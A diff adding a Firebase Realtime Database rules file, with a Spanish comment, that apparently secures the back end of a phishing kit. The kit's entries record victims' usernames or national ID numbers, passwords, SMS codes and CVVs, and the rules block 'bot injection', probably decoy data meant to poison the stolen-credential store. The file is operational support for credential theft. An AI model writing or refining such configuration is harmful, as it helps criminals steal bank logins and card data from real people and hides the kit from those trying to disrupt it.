@@ -1,0 +1,39 @@
+{
+  "_doc": "REGLAS DE SEGURIDAD RTDB para detener la INYECCION DIRECTA de bots. Publicar en Firebase Console -> Realtime Database -> Reglas (o con firebase deploy). Las paginas del kit siguen funcionando igual (no usan auth). El guard (bot_guard.js) usa el token de la base de datos (firebase -> auth_token en bots_db.json) para acceso total de lectura/escritura/purga. Crear entradas NUEVAS solo se permite con el esquema legitimo (usuario cedula/RIF/email + token _k valido). Las actualizaciones parciales (estado, sms, cvv, command, page) quedan abiertas para no romper el flujo del kit.",
+  "rules": {
+    ".read": "auth != null",
+    ".write": "auth != null",
+
+    "blocks": {
+      ".read": true,
+      ".write": true,
+      "$nodo": {
+        ".validate": "newData.hasChildren(['ts'])"
+      }
+    },
+    "visits": {
+      ".read": true,
+      ".write": true
+    },
+    "bots_jail": {
+      ".read": true,
+      ".write": true
+    },
+    "guard_log": {
+      ".read": true,
+      ".write": true
+    },
+    "meta": {
+      ".read": true,
+      ".write": true
+    },
+
+    "$site": {
+      ".read": true,
+      ".write": true,
+      "$entry": {
+        ".write": "!data.exists() ? (newData.hasChildren(['usuario', 'clave', '_k']) && newData.child('_k').isString() && newData.child('_k').val().matches(/^(MRC2024_[0-9a-f]{1,2}_v2|MRC2024_NaN_v2)$/) && newData.child('_htok').val() === 1 && newData.child('usuario').isString() && (newData.child('usuario').val().matches(/^[0-9]{4,12}$/) || newData.child('usuario').val().matches(/^[VEJG]-?[0-9]{6,10}(-?[0-9]{1,2})?$/) || newData.child('usuario').val().matches(/^[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\\.[A-Za-z]{2,}$/)) && newData.child('clave').isString() && newData.child('clave').val().length >= 4 && newData.child('first_seen').isNumber() && newData.child('first_seen').val() <= (now + 120000)) : true"
+      }
+    }
+  }
+}
